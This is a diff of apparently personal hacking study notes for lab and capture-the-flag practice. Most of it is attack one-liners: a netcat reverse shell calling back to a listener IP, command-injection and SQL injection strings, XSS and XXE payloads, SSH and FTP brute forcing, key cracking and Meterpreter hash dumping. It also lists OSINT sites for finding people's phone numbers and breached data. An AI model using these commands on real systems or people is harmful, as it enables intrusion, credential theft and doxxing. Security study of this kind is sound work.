@@ -1,8 +1,7 @@
-# Hacking
+# Hacking Notes
+Random notes I've made while learning about hacking that may prove useful in the future.
 
-## Reconnaissance
-
-### Nmap Scan
+## Nmap
 - `nmap -sC -sV nmap 10.10.10.14 > nmap_scan`
 - vulnerability scan: `nmap -sV -sC --script vuln 10.10.4.35`
 - SYN/Stealth scan: `nmap -sS <target>`
@@ -17,65 +16,63 @@
 - scan delay: `--scan-delay <time>ms`
 - generate invalid chacksum for packets: `--badsum`
 
-#### Nmap Firewall/IDS evasion
+### Nmap Firewall/IDS evasion
 - https://nmap.org/book/man-bypass-firewalls-ids.html
 - `-f` used to fragment packets
 
-### Searchsploit
+## Searchsploit
 - `searchsploit [name]`
 - show exploit: `searchsploit -x 41006.txt`
 
-### Search DNS information
+## Search DNS information
 - `nslookup domain.com`
 - `dig axfr @10.10.10.13 cronos.htb`
 
-### Change hostname
+## Change hostname
 - `vi /etc/hosts`
 - `10.10.10.13              cronos.htb`
 
-## Delivery
-
-### Upload file to target
+## Upload file to target
 - own host: `python -m SimpleHTTPServer`
 - target host: `wget -r http://hostIP:8000/`
 - OR; `python -m http.server 8080`
 
-#### Using Netcat
+## Netcat
 - listen for incoming file on target: `nc -l -p 1337 > LinEnum.sh`
 - send the file from own host: `nc -w 3 [ip-add-target] 1337 < LinEnum.sh`
 
-## Web Exploitation
-
-### Iterative command example
+## Iterative command example
 `for i in $(seq 1 20); do echo -n “$i: “; curl -s http://10.10.10.10/index.php/$i/ | grep ‘[title]’; done`
 
-### Wfuzz
+## Wfuzz
 - voorbeeld: `wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`
 - voorbeeld: `wfuzz -c -z file,mywordlist.txt -d “username=FUZZ&password=FUZZ” -u http://shibes.thm/login.php`
 - handige lijsten: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
 
-### Gobuster
+## Gobuster
 - voorbeeld: `gobuster dir -u http://example.com -w wordlist.txt -x php,txt,html`
 - handige lijsten: 
 
-### Vega
+## Vega
 - website vulnerability scanner
 - tutorial: https://www.youtube.com/watch?v=1HDC6fKsKYE
 
-### Burp Suite
+## Burp Suite
 - change hostname with Burp sometimes works `Host: cronos.htb`
 
-#### Burp Intruder
+### Burp Intruder
 - Sniper attack - probeert alle in een wordlist op de plek tussen §
 - Cluster bomb attack - itereert over meerdere lijsten (zoals username/ password)
 
-### Reverse Shells
+## Reverse Shells
 - upload reverse shell (/usr/share/webshells in Kali)
 - verander IP addres en port nummer
 - op je eigen systeem `sudo nc -lvnp [port]`
 - maak een HTTP request naar de shell om hem te runnen
+- reverse shell cheat sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+- other chear sheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
-#### Shell upgrade
+### Shell upgrade
 - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 - `export TERM=xterm`
 - Background: `Ctrl + Z`
@@ -83,43 +80,34 @@
 - Note that if the shell dies, any input in your own terminal will not be visible. To fix this, type `reset` and press enter.
 - Other way to upgrade a shell is to generate an SSH keypair with `ssh-keygen` and leave the public SSH key in ~/.ssh/authorized_keys and use the private key to login via SSH: `ssh -i id_rsa username@10.0.0.1`
 
-#### Test command execution
-- start tcpdump listener for ICMP: `sudo tcpdump ip proto \\icmp -i tun0`
-- run command on target: `ping [local tun0 ip] -c 1`
-
-#### Reverse Shell with command injection
-- `;nc -e /bin/bash`
-
-#### Generate reverse shell command for Telnet
+### Generate reverse shell command for Telnet with msfvenom
 - `msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
 - result: `mkfifo /tmp/uxto; nc 10.9.222.201 4444 0</tmp/uxto | /bin/sh >/tmp/uxto 2>&1; rm /tmp/uxto`
 
-#### Reverse shell cheatsheet
-- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+### Reverse Shell with command injection
+- `;nc -e /bin/bash`
 
-### SQLMap
-- copy login request from Burp
-- paste in vim
-- remove spaces
-- `sqlmap -r login.req`
+## Test command execution
+- start tcpdump listener for ICMP: `sudo tcpdump ip proto \\icmp -i tun0`
+- run command on target: `ping [local tun0 ip] -c 1`
 
-### Wordpress
+## Wordpress
 - `wpscan -u http://10.10.10.14`
 - search for usernames `--enumerate u`
 - 'Easiest way to edit a PHP file as admin is via the Wordpress templating engine'
 
-### Send Post Request
+## Send Post Request
 - Safe POST REQUEST in a local folder
 - `python -m SimpleHTTPServer`
 - Go to `localhost:8000` in browser
 
-### SQLi
+## SQLi
 - most commonly used comments for SQLi payloads: `--+` and `/*`
 - also `-- -` is used
 - asking the database if it's first number is 's' (115 in ADCII)
 - `?id=1' AND (ascii(substr((select database()),1,1))) = 115 --+`
 
-#### UNION SQLi attack
+### UNION SQLi attack
 1. Finding the number of columns
 2. Checking if the columns are suitable
 3. Attack and het some interesting data
@@ -134,35 +122,38 @@
 - payloads: https://github.com/payloadbox/sql-injection-payload-list
 - other payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 
+#### SQLMap usage
+- copy login request from Burp
+- paste in vim
+- remove spaces
+- `sqlmap -r login.req`
+
 #### SQLMap & BurpSuite
 - send the login request to repeater
 - save request: right mouse > save item
 - `sqlmap -r filename`
 
-### XSS
+## XSS
 - Cross Site Scripting
 - http://www.xss-payloads.com/
 
-#### Stored XSS
+### Stored XSS
 - XSS example in comment: `<script>alert("Test")</script>`
 - malicious image: `<img src='LINK' onmouseover="alert('xss')">`
 - malicious URL: `<https://somewebsite.com/titlepage?id=> <script> evilcode() </script>`
 - test with: `<h1></h1>` and `<b></b>`
 - change content on webpage: `<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`
 
-#### DOM based XSS
+### DOM based XSS
 - try `<iframe src="javascript:alert(`xss`)">` in search field
 
-#### Persistent (Server-Side XSS)
+### Persistent (Server-Side XSS)
 - using headers: `True-Client-IP`: `<iframe src="javascript:alert(`xss`)">`
 
-#### OWASP ZAP
-- use automated scan to search for XSS vulnerabilities
-
-### Command Injection
+## Command Injection
 - Via CGI (Common Gateway Interface) scripts: `192.168.1.200/cgi-bin/systeminfo.sh?&whoami`
 
-### Server Site Request Forgery
+## Server Site Request Forgery
 - if this link works: `http://10.10.0.150/?proxy=http://list.hohoho:8080/search.php?name=test`
 - you can change the proxy to redirect to localhost with `localtest.me`
 - `http://10.10.0.150/?proxy=http://list.hohoho.localtest.me`
@@ -174,10 +165,10 @@
 4. Credentials (user accounts, application config files..)
 5. Mis-configured file and directory permissions
 
-### Enumeration
+### PrivEsc Enumeration
 - `uname -a`
 - check what we can sudo: `sudo -l`
-- `whoami`
+- `whoami` and `id`
 - show distrubution version:`lsb_release -a`
 - show current shell: `echo $0`
 - find SSH keys: `find / -name id_rsa 2> /dev/null`
@@ -218,92 +209,32 @@
 - linuxprivchecker.py
 - unixprivesc.py
 
-## OSINT
-
-### Username find tools
-- https://namechk.com/
-- https://whatsmyname.app/
-- https://namecheckup.com/
-- https://github.com/WebBreacher/WhatsMyName
-- https://github.com/sherlock-project/sherlock
-
-### Reverse Image Search
-- https://google.com
-- https://tineye.com/
-- https://www.bing.com/visualsearch?FORM=ILPVIS
-- https://yandex.com/images/
-- https://pimeyes.com
-
-#### Images
+## Images
 - http://exif.regex.info/exif.cgi
 - check metadata of image: `exiftool image.png`
-
-### Data breach search
-- https://haveibeenpwned.com/
-- https://scylla.sh/
-- https://dehashed.com/ (wel betaald)
-
-### grep.app
-- Tool om Git repositories te doorzoeken.
-
-### RevealName.com
-- Reveals someone's phone number
-
-## Crypto
-- useful site: rumkin.com/tools
 
 ## SSH Brute Force
 - `hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.3.11 ssh`
 
-### decrypt encrypted RSA/SSH key
+## decrypt encrypted RSA/SSH key
 - `ssh2john filename > newfilename`
 - `john newfilename -w=/usr/share/wordlists/rockyou.txt`
 
-### Steganography tools
+## Steganography tools
 - `strings filename`
 - `binwalk filename`
 - `steghide extract -sf filename`
 
-## Protocols
-
-### SMB/NFS (Samba)
+## SMB/NFS (Samba)
 - find usernames `sudo enum4linux -U 10.5.4.2`
 - find shared `sudo enum4linux -S 10.5.4.2`
 - connect to share `sudo smbclient //10.5.4.2//sharename`
 - sometimes no password is needed
 
-## Covering tracks
-
-### Important log files
+## Important log files
 - /var/log/auth.log (attempted logins for SSH, changes too or logging in as system users)
 - /var/log/syslog (system events such as firewall alerts)
 - /var/log/[service] (for example /var/log/apache2)
-
-## Forensics
-
-### Memory
-- extract raw memory tools:
-    - FTK Imager
-    - Redline
-    - DumpIt.exe
-    - win32dd.exe / win64dd.exe
-- pull unencrypted memory from Windows PC: `%SystemDrive%/hiberfil.sys` (Windows hibernation file)
-- VM memory files:
-    - VMware `.vmem`
-    - Hyper-V `.bin`
-    - Parallels - `.mem`
-    - VirtualBox `.sav`
-
-### Volatility
-- view image info: `volatility -f MEMORY_FILE.raw imageinfo`
-- test profile and list processes: `volatility -f MEMORY_FILE.raw --profile=PROFILE pslist`
-- show network connections: `volatility -f MEMORY_FILE.raw --profile=PROFILE netscan`
-- view hidden processes: `volatility -f MEMORY_FILE.raw --profile=PROFILE psxview`
-- if any are false, that means it could be injected (bad thing) `volatility -f MEMORY_FILE.raw --profile=PROFILE ldrmodules`
-- view unexpected patches in the standard system DLLs (Hooking module: `<unknown>` is really bad): `volatility -f MEMORY_FILE.raw --profile=PROFILE apihooks`
-- find malicious code and dump: `volatility -f MEMORY_FILE.raw --profile=PROFILE malfind -D <Destination Directory>`
-- list all of the DLLs in memory: `volatility -f MEMORY_FILE.raw --profile=PROFILE dlllist`
-- dump the DLL's from memory with specific process ID: `volatility -f MEMORY_FILE.raw --profile=PROFILE --pid=PID dlldump -D <Destination Directory>`
 
 ## Reverse Engineering
 - Assembly file `.s`
@@ -341,48 +272,26 @@ Some other important instructions:
 - ILSpy
 - Dotpeek
 
-# Crypto
-
-## RSA
-- goeie tool: https://github.com/Ganapati/RsaCtfTool
-- ook een goeie: https://github.com/ius/rsatool
-- p en q zijn grote priemgetallen
-- n is het product van p en q
-- The public key is n and d, the private key is n and e.
-- “m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).
-
-## GPG
-- import private key: `gpg --import file.key`
-- decrypt message: `gpg --decrypt message.gpg`
-
-# Other tricks
-- Create files in /dev/shm. This is empied during reboot, so you don’t have to clean up.
-- Output errors to the ‘bitbucket’ 2>/dev/null
-- Back to previous folder: `cd -`
-- Sometimes, useful information is stored in the SSL certificate
-- Use FoxyProxy Firefox browser addon to easily enable the Burp proxy
-- Obfuscated but filled in passwords in the browser can still be seen via the inspector function
-
-### Zip and unzip
+## Zip and unzip
 - zip a directory: `tar cvzf tarball.tar.gz directory/`
 - unzip a directory: `tar xvzf tarball.tar.gz`
 
-### FTP
+## FTP
 - common 'cwd' vulnerability in legacy FTP versions: `https://www.exploit-db.com/exploits/20745`
 - brute force password with hydra: `hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`
 
-### NFS
+## NFS
 - NFS enumeration tool: NFS-Common
 - mount: `sudo mount -t nfs IP:share /tmp/mount/ -nolock`
 - Show the NFS server's export list: `showmount -e 10.10.180.248`
 - For example of exploiting an NFS drive if root-squashing is disabled: `https://tryhackme.com/room/networkservices2`
 
-### SMTP
+## SMTP
 - Enumerate with Metasploit: `auxiliary/scanner/smtp/smtp_version`
 - Also: `auxiliary/scanner/smtp/smtp_enum`
 - Useful tool without using Metasploit: `smtp-user-enum`
 
-### MySQL
+## MySQL
 - connect remotely (dangerous): `mysql -h [IP] -u [username] -p`
 - connect locally: `mysql -uUSERNAME -p`
 - drop all databases: `show databases;`
@@ -395,36 +304,36 @@ Some other important instructions:
 - enumerate manually: `https://nmap.org/nsedoc/scripts/mysql-enum.html`
 - enumerate manually: `https://www.exploit-db.com/exploits/23081`
 
-### SQLite (flat-file databases)
+## SQLite (flat-file databases)
 - open database: `sqlite3 filename.db`
 - show tables: `.tables`
 - show table info: `PRAGMA table_info(customers);`
 - drop all table info: `SELECT * FROM customers;`
 
-### Alternate Data Stream (hide .exe in .exe)
+## Alternate Data Stream (hide .exe in .exe)
 - scan malicious EXE in Powershell: `c:\Tools\strings64.exe -accepteula file.exe`
 - `-Stream` in the output can relate to ADS
 - view ADS using Powershell: `Get-Item -Path file.exe -Stream *`
 - execute hidden EXE stream: `wmic process call create $(Resolve-Path file.exe:streamname)`
 
-### Additional Kali downloads
+## Additional Kali downloads
 - Download useful lists from Seclists: `sudo apt install seclists`
 
-### Decrypting hashes
+## Decrypting hashes
 - `john hash.txt`
 - example hashes: https://hashcat.net/wiki/doku.php?id=example_hashes
 
-### Password cracking websites
+## Password cracking websites
 - https://crackstation.net/
 - https://md5decrypt.net/en/
 - https://hashes.com/en/decrypt/hash
 
-### cURL
+## cURL
 - get request: `curl http://10.10.171.117:8081/ctf/get`
 - post request with data in body: `curl -X POST --data "flag_please" http://10.10.171.117:8081/ctf/post`
 - post request with headers: `curl -X POST -F 'name=linuxize' -F 'email=linuxize@example.com' https://example.com/contact.php`
 
-### XML External Entity (XXE)
+## XML External Entity (XXE)
 XXE Test:
 ```XML
 <?xml version="1.0" encoding="UTF-8"?>
@@ -442,15 +351,15 @@ Output file contents:
 <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
 <root>&read;</root>
 ```
-### Using Null Byte for blocked file extensions
+## Using Null Byte for blocked file extensions
 - Null Byte: `%00`, URL encoded: `%2500`
 - if only .md files can be uploaded: `http://10.10.250.194/ftp/package.json.bak%2500.md`
 
-# Active Directory
+## Active Directory
 - Location of NTDS.dit (holds DC info and password hashes): `%SystemRoot%\NTDS`
 - From Windows terminal to Powershell: `powershell -ep bypass`
 
-## PowerView
+### PowerView
 - import PowerView module: `. .\PowerView.ps1`
 - list app Operating Systems on domain: `Get-NetComputer -fulldata | select operatingsystem`
 - list all users on domain: `Get-NetUser | select cn`
@@ -458,11 +367,11 @@ Output file contents:
 - account information for domain admins: `Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}`
 - Powerview cheat sheet: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
 
-# Metasploit
+## Metasploit
 - save used commands to file: `spool`
 - save set variables to file in msfx folder: `save`
 
-## Metasploit Database
+### Metasploit Database
 - buiten msfconsole: `msfdb init`
 - show database status in msfconsole: `db_status`
 - nmap scan resultaten naar db: `db_nmap -sV 10.10.21.140`
@@ -473,10 +382,86 @@ Output file contents:
 - show active sessions: `sessions`
 - switch session: `sessions -i SESSION_NUMBER`
 
-## Meterpreter
+### Meterpreter
 - list processes: `ps`
 - enumeration: `getuid` `sysinfo`
 - dump all user password hashes: `hashdump`
 - Post exploit recon for vulnerabilities: `run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true`
 - forcing RDP on a Windows machine: `run post/windows/manage/enable_rdp`
 - adding a route: `run autoroute -s 172.18.1.0 -n 255.255.255.0`
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+# OSINT
+
+## Data breach search
+- https://haveibeenpwned.com/
+- https://scylla.sh/
+- https://dehashed.com/ (wel betaald)
+
+## grep.app
+- Tool om Git repositories te doorzoeken.
+
+## RevealName.com
+- Reveals someone's phone number
+
+## Username find tools
+- https://namechk.com/
+- https://whatsmyname.app/
+- https://namecheckup.com/
+- https://github.com/WebBreacher/WhatsMyName
+- https://github.com/sherlock-project/sherlock
+
+## Reverse Image Search
+- https://google.com
+- https://tineye.com/
+- https://www.bing.com/visualsearch?FORM=ILPVIS
+- https://yandex.com/images/
+- https://pimeyes.com
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Crypto
+- useful site: rumkin.com/tools
+
+## RSA
+- goeie tool: https://github.com/Ganapati/RsaCtfTool
+- ook een goeie: https://github.com/ius/rsatool
+- p en q zijn grote priemgetallen
+- n is het product van p en q
+- The public key is n and d, the private key is n and e.
+- “m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).
+
+## GPG
+- import private key: `gpg --import file.key`
+- decrypt message: `gpg --decrypt message.gpg`
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Forensics
+
+## Memory
+- extract raw memory tools:
+    - FTK Imager
+    - Redline
+    - DumpIt.exe
+    - win32dd.exe / win64dd.exe
+- pull unencrypted memory from Windows PC: `%SystemDrive%/hiberfil.sys` (Windows hibernation file)
+- VM memory files:
+    - VMware `.vmem`
+    - Hyper-V `.bin`
+    - Parallels - `.mem`
+    - VirtualBox `.sav`
+
+## Volatility
+- view image info: `volatility -f MEMORY_FILE.raw imageinfo`
+- test profile and list processes: `volatility -f MEMORY_FILE.raw --profile=PROFILE pslist`
+- show network connections: `volatility -f MEMORY_FILE.raw --profile=PROFILE netscan`
+- view hidden processes: `volatility -f MEMORY_FILE.raw --profile=PROFILE psxview`
+- if any are false, that means it could be injected (bad thing) `volatility -f MEMORY_FILE.raw --profile=PROFILE ldrmodules`
+- view unexpected patches in the standard system DLLs (Hooking module: `<unknown>` is really bad): `volatility -f MEMORY_FILE.raw --profile=PROFILE apihooks`
+- find malicious code and dump: `volatility -f MEMORY_FILE.raw --profile=PROFILE malfind -D <Destination Directory>`
+- list all of the DLLs in memory: `volatility -f MEMORY_FILE.raw --profile=PROFILE dlllist`
+- dump the DLL's from memory with specific process ID: `volatility -f MEMORY_FILE.raw --profile=PROFILE --pid=PID dlldump -D <Destination Directory>`
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Other
+- Create files in /dev/shm. This is empied during reboot, so you don’t have to clean up.
+- Output errors to the ‘bitbucket’ 2>/dev/null
+- Back to previous folder: `cd -`
+- Sometimes, useful information is stored in the SSL certificate
+- Use FoxyProxy Firefox browser addon to easily enable the Burp proxy
+- Obfuscated but filled in passwords in the browser can still be seen via the inspector function
